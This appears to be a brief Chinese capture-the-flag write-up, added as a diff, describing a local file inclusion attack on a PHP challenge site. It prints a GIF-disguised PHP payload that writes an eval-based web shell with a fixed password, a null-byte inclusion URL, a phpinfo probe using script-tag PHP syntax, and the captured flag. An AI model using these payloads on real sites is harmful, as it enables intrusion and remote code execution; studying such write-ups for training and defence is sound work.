@@ -1,0 +1,25 @@
+扫出tmp目录。
+
+有本地文件包含漏洞。
+
+1462252489
+
+
+http://101.200.145.44/web5/index.php?page=uploads/1462252489.gif%00
+
+GIF89a    
+<?php fputs(fopen('uploads/angelshell.php',"w"),'<?php eval($_POST[\'chopper123\']);?>'); ?>
+
+http://101.200.145.44/web5/index.php?page=uploads/1462254858.gif%00
+
+估计是有防护,内容为： 
+GIF89a  
+<script language="php">phpinfo();</script>   
+
+获得flag: flag{e34349fe-42f4-4d78-b221-48094fe2b2af}  
+
+
+1. LFI
+2. 上传文件未作良好的内容校验。  
+
+
